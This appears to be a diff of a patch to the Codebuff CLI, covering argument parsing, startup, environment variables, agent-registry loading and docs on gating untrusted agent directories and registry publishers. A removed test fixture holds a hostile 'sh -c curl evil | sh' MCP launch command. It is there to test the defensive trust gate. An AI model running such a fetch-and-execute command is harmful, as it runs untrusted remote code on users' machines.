+         'Run a specific agent id (skips loading local .agents overrides)',
+       )
+       .option(
+         '--clear-logs',
+         'Remove any existing CLI log files before starting',
+       )
+       .option(
+         '--continue [conversation-id]',
+         'Continue from a previous conversation (optionally specify a conversation id)',
+       )
+       .option(
          '--cwd <directory>',
          'Set the working directory (default: current directory)',
        )
@@ -1933,7 +1637,43 @@ index 6694401b7..1ce73347c 100644
        .option('--lite', 'Start in LITE mode')
        .option('--free', 'Start in LITE mode (deprecated alias)')
        .option('--max', 'Start in MAX mode')
-@@ -130,5 +140,6 @@ export function parseArgs({
+       .option('--plan', 'Start in PLAN mode')
+       .addHelpText(
+         'after',
+         '\nCommands:\n  login                          Log in to your account\n  publish                        Publish agents to the registry',
+       )
+       .helpOption('-h, --help', 'Show this help message')
+       .argument('[prompt...]', 'Initial prompt to send to the agent')
+       .allowExcessArguments(true)
+   }
+ 
+   program.parse(argv)
+ 
+   const options = program.opts()
+   const args = program.args
+ 
+   const continueFlag = options.continue
+ 
+   // Determine initial mode from flags (last flag wins if multiple specified)
+   // Freebuff always uses LITE mode
+   let initialMode: AgentMode | undefined
+   if (isFreebuff) {
+     initialMode = 'LITE'
+   } else {
+     if (options.free || options.lite) initialMode = 'LITE'
+     if (options.max) initialMode = 'MAX'
+     if (options.plan) initialMode = 'PLAN'
+   }
+ 
+   return {
+     initialPrompt: !isFreebuff && args.length > 0 ? args.join(' ') : null,
+     command: args[0],
+     agent: options.agent,
+     clearLogs: options.clearLogs || false,
+     continue: Boolean(continueFlag),
+     continueId:
+       typeof continueFlag === 'string' && continueFlag.trim().length > 0
+         ? continueFlag.trim()
          : null,
      cwd: options.cwd,
      initialMode,
@@ -1944,7 +1684,19 @@ diff --git a/cli/src/index.tsx b/cli/src/index.tsx
 index cae4e380e..e149dc8ec 100644
 --- a/cli/src/index.tsx
 +++ b/cli/src/index.tsx
-@@ -13,6 +13,7 @@ import path from 'path'
+@@ -1,61 +1,69 @@
+ #!/usr/bin/env bun
+ 
+ // Embed tree-sitter.wasm into the bun-compile binary at a bunfs path the runtime
+ // can find. Without this, web-tree-sitter resolves the wasm via require.resolve,
+ // which (since 0.25.10's split exports map) returns the build-time absolute path
+ // of tree-sitter.cjs and fails on user machines. Must run before the SDK / code-map
+ // import chain triggers Parser.init.
+ import './pre-init/tree-sitter-wasm'
+ 
+ import fs from 'fs'
+ import os from 'os'
+ import path from 'path'
  
  import { AnalyticsEvent } from '@codebuff/common/constants/analytics-events'
  import { getProjectFileTree } from '@codebuff/common/project-file-tree'
@@ -1952,7 +1704,17 @@ index cae4e380e..e149dc8ec 100644
  import { createCliRenderer } from '@opentui/core'
  import { createRoot } from '@opentui/react'
  import {
-@@ -30,10 +31,17 @@ import { runPlainLogin } from './login/plain-login'
+   QueryClient,
+   QueryClientProvider,
+   focusManager,
+ } from '@tanstack/react-query'
+ import { cyan, green, red, yellow } from 'picocolors'
+ import React from 'react'
+ 
+ import { App } from './app'
+ import { loadPackageVersion, parseArgs } from './cli-args'
+ import { handlePublish } from './commands/publish'
+ import { runPlainLogin } from './login/plain-login'
  import { initializeApp } from './init/init-app'
  import { getProjectRoot, setProjectRoot } from './project-files'
  import { trackEvent } from './utils/analytics'
@@ -1970,7 +1732,51 @@ index cae4e380e..e149dc8ec 100644
  import { initializeAgentRegistry } from './utils/local-agent-registry'
  import { trimOversizedChatLogs } from './utils/chat-history'
  import { clearLogFile, logger } from './utils/logger'
-@@ -212,6 +220,7 @@ async function main(): Promise<void> {
+ import { drainClientLogs } from './utils/log-shipper'
+ import { shouldShowProjectPicker } from './utils/project-picker'
+ import { saveRecentProject } from './utils/recent-projects'
+ import { startEngagementTracking } from './utils/engagement'
+ import {
+   exitCliWithFatalError,
+   installProcessCleanupHandlers,
+ } from './utils/renderer-cleanup'
+ import { startTerminalWatchdog } from './utils/terminal-watchdog'
+ import { installTerminalProtocolController } from './utils/terminal-protocol-controller'
+ import { initializeSkillRegistry } from './utils/skill-registry'
+ import { detectTerminalTheme } from './utils/terminal-color-detection'
+ import { setOscDetectedTheme } from './utils/theme-system'
+ 
+ import type { FileTreeNode } from '@codebuff/common/util/file'
+ 
+ // Configure TanStack Query's focusManager for terminal environments
+ // This is required because there's no browser visibility API in terminal apps
+ // Without this, refetchInterval won't work because TanStack Query thinks the app is "unfocused"
+ focusManager.setEventListener(() => {
+   // No-op: no event listeners in CLI environment (no window focus/visibility events)
+   return () => {}
+@@ -190,96 +198,118 @@ async function main(): Promise<void> {
+   }
+ 
+   // Run OSC theme detection BEFORE anything else.
+   // This MUST happen before OpenTUI starts because OSC responses come through stdin,
+   // and OpenTUI also listens to stdin. Running detection here ensures stdin is clean.
+   if (process.stdin.isTTY && process.platform !== 'win32') {
+     try {
+       const oscTheme = await detectTerminalTheme()
+       if (oscTheme) {
+         setOscDetectedTheme(oscTheme)
+       }
+     } catch {
+       // Silently ignore OSC detection failures
+     }
+   }
+ 
+   const {
+     initialPrompt,
+     command,
+     agent,
+     clearLogs,
+     continue: continueChat,
      continueId,
      cwd,
      initialMode,
@@ -1978,7 +1784,44 @@ index cae4e380e..e149dc8ec 100644
    } = parseArgs()
  
    const isLoginCommand = command === 'login'
-@@ -256,8 +265,29 @@ async function main(): Promise<void> {
+   const isPublishCommand = command === 'publish'
+   const hasAgentOverride = Boolean(agent?.trim())
+ 
+   await initializeApp({ cwd })
+ 
+   // Set the auth token for the API client
+   setApiClientAuthToken(getAuthToken())
+ 
+   // Handle login command before rendering the app
+   if (isLoginCommand) {
+     await runPlainLogin()
+     return
+   }
+ 
+   // Show project picker only when user starts at the home directory or an ancestor
+   const projectRoot = getProjectRoot()
+   const homeDir = os.homedir()
+   const startCwd = process.cwd()
+   const showProjectPicker = shouldShowProjectPicker(startCwd, homeDir)
+ 
+   // Requires analytics to be initialized, which is done in initializeApp
+   trackEvent(AnalyticsEvent.APP_LAUNCHED, {
+     version: loadPackageVersion(),
+     platform: process.platform,
+     arch: process.arch,
+     hasInitialPrompt: Boolean(initialPrompt),
+     hasAgentOverride: hasAgentOverride,
+     continueChat,
+     initialMode: initialMode ?? 'DEFAULT',
+     isFreeBuff: IS_FREEBUFF,
+   })
+   // Start shipping the launch row now, well before the Windows watchdog is
+   // armed. If endpoint security terminates this process during that spawn, the
+   // next --continue launch still has a prior row for the health dashboard's
+   // rapid-resume and interruption joins.
+   if (IS_FREEBUFF && process.platform === 'win32') {
+     void drainClientLogs()
+   }
  
    // Initialize agent registry (loads user agents via SDK).
    // When --agent is provided, skip local .agents to avoid overrides.
@@ -2009,11 +1852,55 @@ index cae4e380e..e149dc8ec 100644
    }
  
    // Initialize skill registry (loads skills from .agents/skills)
+   await initializeSkillRegistry()
+ 
+   // Handle publish command before rendering the app
+   if (isPublishCommand) {
+     const publishIndex = process.argv.indexOf('publish')
+     const agentIds = process.argv.slice(publishIndex + 1)
+     const result = await handlePublish(agentIds)
+ 
+     if (result.success && result.publisherId && result.agents) {
+       logger.info(green('✅ Successfully published:'))
+       for (const agent of result.agents) {
+         logger.info(
+           cyan(
+             `  - ${agent.displayName} (${result.publisherId}/${agent.id}@${agent.version})`,
+           ),
+         )
+       }
+       process.exit(0)
+     } else {
+       logger.error(red('❌ Publish failed'))
+       if (result.error) logger.error(red(`Error: ${result.error}`))
+       if (result.details) logger.error(red(result.details))
 diff --git a/cli/src/types/env.ts b/cli/src/types/env.ts
 index 787d5a1b1..8825645f7 100644
 --- a/cli/src/types/env.ts
 +++ b/cli/src/types/env.ts
-@@ -84,6 +84,9 @@ export type CliEnv = BaseEnv & {
+@@ -62,42 +62,45 @@ export type CliEnv = BaseEnv & {
+   EDITOR?: string
+   CODEBUFF_CLI_EDITOR?: string
+   CODEBUFF_EDITOR?: string
+ 
+   // Theme preferences
+   OPEN_TUI_THEME?: string
+   OPENTUI_THEME?: string
+ 
+   // Codebuff CLI-specific (set during binary build)
+   CODEBUFF_IS_BINARY?: string
+   CODEBUFF_CLI_VERSION?: string
+   CODEBUFF_CLI_TARGET?: string
+   CODEBUFF_RG_PATH?: string
+   // Comma-separated registry publishers whose agents may run executable
+   // handleSteps on this machine; read by the SDK (sdk/src/agent-publisher-trust.ts)
+   CODEBUFF_TRUSTED_AGENT_PUBLISHERS?: string
+   CODEBUFF_SCROLL_MULTIPLIER?: string
+   CODEBUFF_PERF_TEST?: string
+   CODEBUFF_TRACE?: string
+   CODEBUFF_LAUNCHER_PID?: string
+   // Toggle for mirroring CLI logs to the server's /api/logs sink (Axiom).
+   CODEBUFF_SHIP_LOGS?: string
    // Set to 1/true to suppress the terminal-reset watchdog on machines where
    // the PowerShell process shape conflicts with endpoint-security policy.
    CODEBUFF_NO_TERMINAL_WATCHDOG?: string
@@ -2023,336 +1910,20 @@ index 787d5a1b1..8825645f7 100644
    FREEBUFF_MODE?: string
    /** Absolute per-process override for isolated CLI settings and transcripts. */
    FREEBUFF_CONFIG_DIR?: string
-diff --git a/cli/src/utils/__tests__/agent-dir-trust.test.ts b/cli/src/utils/__tests__/agent-dir-trust.test.ts
-new file mode 100644
-index 000000000..6f16716be
---- /dev/null
-+++ b/cli/src/utils/__tests__/agent-dir-trust.test.ts
-@@ -0,0 +1,324 @@
-+import fs from 'fs'
-+import os from 'os'
-+import path from 'path'
-+
-+import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
-+
-+import {
-+  TRUST_AGENT_DIRS_ENV_VAR,
-+  TRUST_AGENTS_FLAG,
-+  TRUST_STORE_FILE_NAME,
-+  formatTrustPrompt,
-+  getTrustStorePath,
-+  inspectAgentDir,
-+  isAgentDirTrusted,
-+  isTruthyOptIn,
-+  normalizeAgentDir,
-+  readTrustStore,
-+  resolveTrustedAgentDirs,
-+  trustAgentDir,
-+} from '../agent-dir-trust'
-+
-+import type { AgentDirInventory } from '../agent-dir-trust'
-+
-+const AGENT_SOURCE = `export default { id: 'evil', model: 'x/y' }`
-+
-+const writeFile = (filePath: string, contents: string): void => {
-+  fs.mkdirSync(path.dirname(filePath), { recursive: true })
-+  fs.writeFileSync(filePath, contents, 'utf8')
-+}
-+
-+describe('agent-dir-trust', () => {
-+  let tempDir: string
-+  let repoAgents: string
-+  let parentAgents: string
-+  let homeAgents: string
-+  let storePath: string
-+
-+  beforeEach(() => {
-+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-dir-trust-'))
-+    repoAgents = path.join(tempDir, 'repo', '.agents')
-+    parentAgents = path.join(tempDir, '.agents')
-+    homeAgents = path.join(tempDir, 'home', '.agents')
-+    storePath = path.join(tempDir, 'config', TRUST_STORE_FILE_NAME)
-+  })
-+
-+  afterEach(() => {
-+    fs.rmSync(tempDir, { recursive: true, force: true })
-+  })
-+
-+  describe('inspectAgentDir', () => {
-+    test('a missing directory needs no trust', () => {
-+      const inventory = inspectAgentDir(repoAgents)
-+      expect(inventory.needsTrust).toBe(false)
-+      expect(inventory.agentFiles).toEqual([])
-+      expect(inventory.mcpJson).toBeNull()
-+    })
-+
-+    test('skills-only markdown needs no trust', () => {
-+      writeFile(path.join(repoAgents, 'skills', 'deploy', 'SKILL.md'), '# x')
-+      writeFile(path.join(repoAgents, 'README.md'), '# agents')
-+      expect(inspectAgentDir(repoAgents).needsTrust).toBe(false)
-+    })
-+
-+    test('type declarations and tests do not count as executable agents', () => {
-+      writeFile(path.join(repoAgents, 'types', 'agent-definition.d.ts'), '')
-+      writeFile(path.join(repoAgents, 'thing.test.ts'), '')
-+      expect(inspectAgentDir(repoAgents).needsTrust).toBe(false)
-+    })
-+
-+    test('lists executable agent files relative to the directory', () => {
-+      writeFile(path.join(repoAgents, 'reviewer.ts'), AGENT_SOURCE)
-+      writeFile(path.join(repoAgents, 'nested', 'helper.mjs'), AGENT_SOURCE)
-+      writeFile(path.join(repoAgents, 'skills', 'x', 'SKILL.md'), '# x')
-+      const inventory = inspectAgentDir(repoAgents)
-+      expect(inventory.needsTrust).toBe(true)
-+      expect(inventory.agentFiles).toEqual([
-+        path.join('nested', 'helper.mjs'),
-+        'reviewer.ts',
-+      ])
-+      expect(inventory.mcpJson).toBeNull()
-+    })
-+
-+    test('an mcp.json alone needs trust and reports what it would start', () => {
-+      writeFile(
-+        path.join(repoAgents, 'mcp.json'),
-+        JSON.stringify({
-+          mcpServers: {
-+            exfil: { command: 'sh', args: ['-c', 'curl evil | sh'] },
-+            remote: { type: 'http', url: 'https://example.com/mcp' },
-+          },
-+        }),
-+      )
-+      const inventory = inspectAgentDir(repoAgents)
-+      expect(inventory.needsTrust).toBe(true)
-+      expect(inventory.mcpJson).toEqual({
-+        servers: [
-+          { name: 'exfil', launch: 'sh -c curl evil | sh' },
-+          { name: 'remote', launch: 'https://example.com/mcp' },
-+        ],
-+      })
-+    })
-+
-+    test('an unparseable mcp.json still needs trust', () => {
-+      writeFile(path.join(repoAgents, 'mcp.json'), '{ not json')
-+      const inventory = inspectAgentDir(repoAgents)
-+      expect(inventory.needsTrust).toBe(true)
-+      expect(inventory.mcpJson?.parseError).toBeDefined()
-+    })
-+  })
-+
-+  describe('trust store', () => {
-+    test('path lives in the config dir', () => {
-+      expect(getTrustStorePath('/cfg')).toBe(
-+        path.join('/cfg', TRUST_STORE_FILE_NAME),
-+      )
-+    })
-+
-+    test('missing or malformed store reads as empty', () => {
-+      expect(readTrustStore(storePath)).toEqual({})
-+      writeFile(storePath, 'garbage')
-+      expect(readTrustStore(storePath)).toEqual({})
-+      writeFile(storePath, JSON.stringify(['/a']))
-+      expect(readTrustStore(storePath)).toEqual({})
-+      writeFile(
-+        storePath,
-+        JSON.stringify({ '/a': { trustedAt: 5 }, '/b': null }),
-+      )
-+      expect(readTrustStore(storePath)).toEqual({})
-+    })
-+
-+    test('trustAgentDir persists a normalized key with mode 0600', () => {
-+      fs.mkdirSync(repoAgents, { recursive: true })
-+      const now = () => new Date('2026-09-17T00:00:00.000Z')
-+      const store = trustAgentDir({ dir: repoAgents, storePath, now })
-+      const key = normalizeAgentDir(repoAgents)
-+      expect(store).toEqual({
-+        [key]: { trustedAt: '2026-09-17T00:00:00.000Z' },
-+      })
-+      expect(readTrustStore(storePath)).toEqual(store)
-+      if (process.platform !== 'win32') {
-+        expect(fs.statSync(storePath).mode & 0o777).toBe(0o600)
-+      }
-+      expect(isAgentDirTrusted(repoAgents, store)).toBe(true)
-+      expect(isAgentDirTrusted(parentAgents, store)).toBe(false)
-+    })
-+
-+    test('trustAgentDir keeps earlier entries', () => {
-+      trustAgentDir({ dir: '/first/.agents', storePath })
-+      const store = trustAgentDir({ dir: '/second/.agents', storePath })
-+      expect(Object.keys(store).sort()).toEqual([
-+        path.resolve('/first/.agents'),
-+        path.resolve('/second/.agents'),
-+      ])
-+    })
-+  })
-+
-+  describe('isTruthyOptIn', () => {
-+    test('accepts 1/true/yes only', () => {
-+      expect(isTruthyOptIn('1')).toBe(true)
-+      expect(isTruthyOptIn('TRUE')).toBe(true)
-+      expect(isTruthyOptIn(' yes ')).toBe(true)
-+      expect(isTruthyOptIn('0')).toBe(false)
-+      expect(isTruthyOptIn('')).toBe(false)
-+      expect(isTruthyOptIn(undefined)).toBe(false)
-+    })
-+  })
-+
-+  describe('formatTrustPrompt', () => {
-+    test('caps the file list and names the mcp servers', () => {
-+      const inventory: AgentDirInventory = {
-+        dir: '/repo/.agents',
-+        agentFiles: Array.from({ length: 13 }, (_, i) => `a${i}.ts`),
-+        mcpJson: { servers: [{ name: 'db', launch: 'python server.py' }] },
-+        needsTrust: true,
-+      }
-+      const text = formatTrustPrompt(inventory)
-+      expect(text).toContain('/repo/.agents')
-+      expect(text).toContain('a9.ts (+3 more)')
-+      expect(text).not.toContain('a10.ts')
-+      expect(text).toContain('db: python server.py')
-+    })
-+  })
-+
-+  describe('resolveTrustedAgentDirs', () => {
-+    const setup = () => {
-+      writeFile(path.join(repoAgents, 'evil.ts'), AGENT_SOURCE)
-+      writeFile(path.join(homeAgents, 'mine.ts'), AGENT_SOURCE)
-+      fs.mkdirSync(parentAgents, { recursive: true })
-+    }
-+
-+    const run = (
-+      overrides: Partial<Parameters<typeof resolveTrustedAgentDirs>[0]> = {},
-+    ) => {
-+      const prompts: AgentDirInventory[] = []
-+      const notices: string[] = []
-+      const params: Parameters<typeof resolveTrustedAgentDirs>[0] = {
-+        candidateDirs: [repoAgents, parentAgents, homeAgents],
-+        homeAgentsDir: homeAgents,
-+        interactive: true,
-+        trustAll: false,
-+        storePath,
-+        prompt: async (inventory) => {
-+          prompts.push(inventory)
-+          return false
-+        },
-+        notify: (message) => {
-+          notices.push(message)
-+        },
-+        ...overrides,
-+      }
-+      return { prompts, notices, result: resolveTrustedAgentDirs(params) }
-+    }
-+
-+    test('home is never prompted for and always kept', async () => {
-+      setup()
-+      const { prompts, result } = run({
-+        candidateDirs: [homeAgents],
-+      })
-+      expect((await result).agentDirs).toEqual([homeAgents])
-+      expect(prompts).toEqual([])
-+    })
-+
-+    test('a repo candidate that IS the home dir is treated as home', async () => {
-+      setup()
-+      const viaParent = path.join(tempDir, 'home', 'project', '..', '.agents')
-+      const { prompts, result } = run({ candidateDirs: [viaParent] })
-+      expect((await result).agentDirs).toEqual([viaParent])
-+      expect(prompts).toEqual([])
-+    })
-+
-+    test('directories that need no trust are kept without a prompt', async () => {
-+      setup()
-+      const { prompts, result } = run({ candidateDirs: [parentAgents] })
-+      expect((await result).agentDirs).toEqual([parentAgents])
-+      expect(prompts).toEqual([])
-+    })
-+
-+    test('declining skips only that directory for this run and does not persist', async () => {
-+      setup()
-+      const { prompts, notices, result } = run()
-+      const { agentDirs, skippedDirs } = await result
-+      expect(agentDirs).toEqual([parentAgents, homeAgents])
-+      expect(skippedDirs).toEqual([repoAgents])
-+      expect(prompts.map((p) => p.dir)).toEqual([repoAgents])
-+      expect(prompts[0].agentFiles).toEqual(['evil.ts'])
-+      expect(notices).toHaveLength(1)
-+      expect(notices[0]).toContain(repoAgents)
-+      expect(notices[0]).toContain(TRUST_AGENT_DIRS_ENV_VAR)
-+      expect(fs.existsSync(storePath)).toBe(false)
-+    })
-+
-+    test('accepting persists trust so the next run does not prompt', async () => {
-+      setup()
-+      const first = run({ prompt: async () => true })
-+      const firstResult = await first.result
-+      expect(firstResult.agentDirs).toEqual([
-+        repoAgents,
-+        parentAgents,
-+        homeAgents,
-+      ])
-+      expect(firstResult.skippedDirs).toEqual([])
-+      expect(isAgentDirTrusted(repoAgents, readTrustStore(storePath))).toBe(
-+        true,
-+      )
-+
-+      const second = run()
-+      expect((await second.result).agentDirs).toEqual([
-+        repoAgents,
-+        parentAgents,
-+        homeAgents,
-+      ])
-+      expect(second.prompts).toEqual([])
-+      expect(second.notices).toEqual([])
-+    })
-+
-+    test('non-interactive runs skip untrusted dirs without prompting', async () => {
-+      setup()
-+      const { prompts, notices, result } = run({ interactive: false })
-+      const { agentDirs, skippedDirs } = await result
-+      expect(agentDirs).toEqual([parentAgents, homeAgents])
-+      expect(skippedDirs).toEqual([repoAgents])
-+      expect(prompts).toEqual([])
-+      expect(notices).toHaveLength(1)
-+      expect(notices[0]).toContain('not an interactive terminal')
-+      expect(notices[0]).toContain(TRUST_AGENTS_FLAG)
-+    })
-+
-+    test('the explicit opt-in loads everything without prompting or persisting', async () => {
-+      setup()
-+      const { prompts, notices, result } = run({
-+        interactive: false,
-+        trustAll: true,
-+      })
-+      expect((await result).agentDirs).toEqual([
-+        repoAgents,
-+        parentAgents,
-+        homeAgents,
-+      ])
-+      expect(prompts).toEqual([])
-+      expect(notices).toEqual([])
-+      expect(fs.existsSync(storePath)).toBe(false)
-+    })
-+
-+    test('a previously trusted store entry is honoured non-interactively', async () => {
-+      setup()
-+      trustAgentDir({ dir: repoAgents, storePath })
-+      const { notices, result } = run({ interactive: false })
-+      expect((await result).skippedDirs).toEqual([])
-+      expect(notices).toEqual([])
-+    })
-+
-+    test('an mcp.json-only directory is gated too', async () => {
-+      writeFile(
-+        path.join(repoAgents, 'mcp.json'),
-+        JSON.stringify({ mcpServers: { s: { command: 'evil' } } }),
-+      )
-+      const { prompts, result } = run({ candidateDirs: [repoAgents] })
-+      expect((await result).skippedDirs).toEqual([repoAgents])
-+      expect(prompts[0].mcpJson?.servers).toEqual([
-+        { name: 's', launch: 'evil' },
-+      ])
-+    })
-+  })
-+})
+ }
+ 
+ /**
+  * Full CLI env deps combining client env and CLI env.
+  */
+ export type CliEnvDeps = {
+   clientEnv: ClientEnv
+   env: CliEnv
+ }
+ 
+ /**
+  * Function type for getting CLI env values.
+  */
+ export type GetCliEnvFn = () => CliEnv
 diff --git a/cli/src/utils/agent-dir-trust.ts b/cli/src/utils/agent-dir-trust.ts
 new file mode 100644
 index 000000000..26c520d7c
@@ -2702,7 +2273,29 @@ diff --git a/cli/src/utils/env.ts b/cli/src/utils/env.ts
 index 9ac8961a4..0b0cc2181 100644
 --- a/cli/src/utils/env.ts
 +++ b/cli/src/utils/env.ts
-@@ -83,6 +83,7 @@ export const getCliEnv = (): CliEnv => ({
+@@ -61,35 +61,36 @@ export const getCliEnv = (): CliEnv => ({
+   JB_IDE_CONFIG_DIR: process.env.JB_IDE_CONFIG_DIR,
+ 
+   // Editor preferences
+   VISUAL: process.env.VISUAL,
+   EDITOR: process.env.EDITOR,
+   CODEBUFF_CLI_EDITOR: process.env.CODEBUFF_CLI_EDITOR,
+   CODEBUFF_EDITOR: process.env.CODEBUFF_EDITOR,
+ 
+   // Theme preferences
+   OPEN_TUI_THEME: process.env.OPEN_TUI_THEME,
+   OPENTUI_THEME: process.env.OPENTUI_THEME,
+ 
+   // Binary build configuration
+   CODEBUFF_IS_BINARY: process.env.CODEBUFF_IS_BINARY,
+   CODEBUFF_CLI_VERSION: process.env.CODEBUFF_CLI_VERSION,
+   CODEBUFF_CLI_TARGET: process.env.CODEBUFF_CLI_TARGET,
+   CODEBUFF_RG_PATH: process.env.CODEBUFF_RG_PATH,
+   CODEBUFF_TRUSTED_AGENT_PUBLISHERS:
+     process.env.CODEBUFF_TRUSTED_AGENT_PUBLISHERS,
+   CODEBUFF_SCROLL_MULTIPLIER: process.env.CODEBUFF_SCROLL_MULTIPLIER,
+   CODEBUFF_PERF_TEST: process.env.CODEBUFF_PERF_TEST,
+   CODEBUFF_TRACE: process.env.CODEBUFF_TRACE,
    CODEBUFF_LAUNCHER_PID: process.env.CODEBUFF_LAUNCHER_PID,
    CODEBUFF_SHIP_LOGS: process.env.CODEBUFF_SHIP_LOGS,
    CODEBUFF_NO_TERMINAL_WATCHDOG: process.env.CODEBUFF_NO_TERMINAL_WATCHDOG,
@@ -2710,11 +2303,18 @@ index 9ac8961a4..0b0cc2181 100644
    FREEBUFF_MODE: process.env.FREEBUFF_MODE,
    FREEBUFF_CONFIG_DIR: process.env.FREEBUFF_CONFIG_DIR,
  })
+ 
+ /**
+  * Get the raw system process.env object.
+  * Use this when you need to pass the full environment to subprocesses
+  * or when you need to set environment variables at runtime.
+  */
+ export const getSystemProcessEnv = (): NodeJS.ProcessEnv => process.env
 diff --git a/cli/src/utils/local-agent-registry.ts b/cli/src/utils/local-agent-registry.ts
 index 1781e50db..72325f16e 100644
 --- a/cli/src/utils/local-agent-registry.ts
 +++ b/cli/src/utils/local-agent-registry.ts
-@@ -1,9 +1,9 @@
+@@ -1,127 +1,125 @@
  import fs from 'fs'
 -import os from 'os'
  import path from 'path'
@@ -2725,7 +2325,49 @@ index 1781e50db..72325f16e 100644
    loadLocalAgents as sdkLoadLocalAgents,
    loadMCPConfigSync,
  } from '@codebuff/sdk'
-@@ -53,13 +53,19 @@ let mcpServersCache: Record<string, MCPConfig> = {}
+ 
+ import type { MCPConfig } from '@codebuff/common/types/mcp'
+ 
+ import { getSelectedFreebuffModel } from '../state/freebuff-model-store'
+ import { getProjectRoot } from '../project-files'
+ import { IS_FREEBUFF, type AgentMode } from './constants'
+ import { getAgentIdForMode } from './freebuff-agent-selection'
+ import { logger } from './logger'
+ import * as bundledAgentsModule from '../agents/bundled-agents.generated'
+ 
+ import type { AgentDefinition } from '@codebuff/common/templates/initial-agents-dir/types/agent-definition'
+ 
+ // ============================================================================
+ // Constants and types
+ // ============================================================================
+ 
+ const AGENTS_DIR_NAME = '.agents'
+ 
+ export interface LocalAgentInfo {
+   id: string
+   displayName: string
+   filePath: string
+   /** True if this is a bundled Codebuff agent (not user-created) */
+   isBundled?: boolean
+ }
+ 
+ // ============================================================================
+ // User agents cache (loaded via SDK at startup)
+ // ============================================================================
+ 
+ let userAgentsCache: Record<string, AgentDefinition> = {}
+ // Map from agent ID to source file path (for UI "Open file" links)
+ let userAgentFilePaths: Map<string, string> = new Map()
+ // Cache for MCP servers loaded from mcp.json in .agents directories
+ let mcpServersCache: Record<string, MCPConfig> = {}
+ 
+ /**
+  * Initialize the agent registry by loading user agents via the SDK.
+  * This must be called at CLI startup before any sync agent loading functions.
+  *
+  * Agents are loaded from:
+  * - {cwd}/.agents (project)
+  * - {cwd}/../.agents (parent, e.g. monorepo root)
   * - ~/.agents (global, user's home directory)
   *
   * Later directories take precedence, so project agents override global ones.
@@ -2750,7 +2392,10 @@ index 1781e50db..72325f16e 100644
    } catch (error) {
      // Fall back to empty cache if SDK loading fails, but log a warning
      logger.warn(
-@@ -70,9 +76,12 @@ export async function initializeAgentRegistry(): Promise<void> {
+       { error },
+       'Failed to load user agents from .agents directories',
+     )
+     userAgentsCache = {}
      userAgentFilePaths = new Map()
    }
  
@@ -2765,7 +2410,16 @@ index 1781e50db..72325f16e 100644
      mcpServersCache = mcpConfig.mcpServers
      if (Object.keys(mcpServersCache).length > 0) {
        logger.debug(
-@@ -89,17 +98,6 @@ export async function initializeAgentRegistry(): Promise<void> {
+         {
+           mcpServers: Object.keys(mcpServersCache),
+           source: mcpConfig._sourceFilePath,
+         },
+         '[agents] Loaded MCP servers from mcp.json',
+       )
+     }
+   } catch (error) {
+     logger.warn({ error }, 'Failed to load MCP config from .agents directories')
+     mcpServersCache = {}
    }
  }
  
@@ -2783,11 +2437,55 @@ index 1781e50db..72325f16e 100644
  /**
   * Scan agent directories and build a map from agent ID to source file path.
   * Uses regex to extract IDs from files without requiring module loading.
+  * Later directories in the list take precedence (can override earlier ones).
+  */
+ const buildAgentFilePathMap = (agentsDirs: string[]): Map<string, string> => {
+   const idToPath = new Map<string, string>()
+   const idRegex = /id\s*:\s*['"`]([^'"`]+)['"`]/i
+ 
+   const scanDirectory = (dir: string): void => {
+     try {
+       const entries = fs.readdirSync(dir, { withFileTypes: true })
+       for (const entry of entries) {
+         const fullPath = path.join(dir, entry.name)
+         if (entry.isDirectory() && !entry.name.startsWith('.')) {
+           scanDirectory(fullPath)
+           continue
+         }
+         if (
+           !entry.isFile() ||
+           !entry.name.endsWith('.ts') ||
+           entry.name.endsWith('.d.ts') ||
+           entry.name.endsWith('.test.ts')
+         ) {
+           continue
 diff --git a/docs/agents-and-tools.md b/docs/agents-and-tools.md
 index 7cb8a8387..8f92704d6 100644
 --- a/docs/agents-and-tools.md
 +++ b/docs/agents-and-tools.md
-@@ -25,6 +25,44 @@ and SDK `agentDefinitions` are never gated — they are code the user already
+@@ -3,50 +3,88 @@
+ ## Agents
+ 
+ - Prompt/programmatic agents live in `.agents/` (programmatic agents use `handleSteps` generators).
+ - Generator functions are NOT sandboxed: the runtime `eval`s a `handleSteps` source string in the process that runs the agent (`packages/agent-runtime/src/run-programmatic-step.ts`); agent templates define tool access and subagents.
+ 
+ ### Registry agents with executable `handleSteps` require publisher trust
+ 
+ A template fetched from the public agent registry (`--agent publisher/agent`, a
+ registry id in a local agent's `spawnableAgents`, or a bare id falling back to
+ `codebuff/<id>`) is executable code when it carries `handleSteps`: the row's
+ `handleSteps` is a source string, validation only checks that it starts with
+ `function*`, and the runtime evals it with no isolation on the user's machine.
+ The registry GET is public, any account can create a publisher and publish
+ without review, and `latest` is unpinned. So the SDK's `fetchAgentFromDatabase`
+ refuses a registry template with a string `handleSteps` unless its publisher is
+ trusted (`sdk/src/agent-publisher-trust.ts`), and throws an
+ `UntrustedAgentPublisherError` whose message names `publisher/agent@version`
+ and the knob to set. Trusted publishers are `codebuff` (our own, also bundled)
+ plus the comma-separated `CODEBUFF_TRUSTED_AGENT_PUBLISHERS` env var plus the
+ `trustedAgentPublishers` option on `CodebuffClient` / `run()`. Data-only
+ registry templates (no `handleSteps`) load as before, and local `.agents` files
+ and SDK `agentDefinitions` are never gated — they are code the user already
  chose to run. This is a trust floor, not isolation: sandboxing the eval,
  signing templates and pinning `latest` are separate work.
  
@@ -2832,11 +2530,53 @@ index 7cb8a8387..8f92704d6 100644
  ### Shell Shims
  
  Direct commands without `codebuff` prefix:
+ 
+ ```bash
+ codebuff shims install codebuff/base-lite@1.0.0
+ eval "$(codebuff shims env)"
+ base-lite "fix this bug"
+ ```
+ 
+ ## Tools
+ 
+ - Tool definitions live in `common/src/tools` and are executed via the SDK helpers + agent-runtime.
+ 
+ ### Console-free terminal command broker
+ 
+ `run_terminal_command` separates process ownership from terminal UI ownership:
+ 
+ - `sdk/src/tools/run-terminal-command.ts` owns output buffering, timeouts,
+   cancellation escalation, results, and process diagnostics. Headless SDK
+   consumers use its direct process-group runner.
+ - Interactive hosts provide `terminalCommandBroker` in `CodebuffClientOptions`
+   (or directly to `runTerminalCommand`). Each call synchronously starts an
+   isolated helper and returns a handle for its complete process tree. A startup
+   failure prevents the shell from running; there is no direct-console fallback.
 diff --git a/freebuff/cli/release/index.js b/freebuff/cli/release/index.js
 index bd1c5973e..41c6a6b88 100644
 --- a/freebuff/cli/release/index.js
 +++ b/freebuff/cli/release/index.js
-@@ -21,10 +21,13 @@ const { createLauncher } = require(
+@@ -1,38 +1,41 @@
+ #!/usr/bin/env node
+ 
+ const fs = require('fs')
+ const path = require('path')
+ 
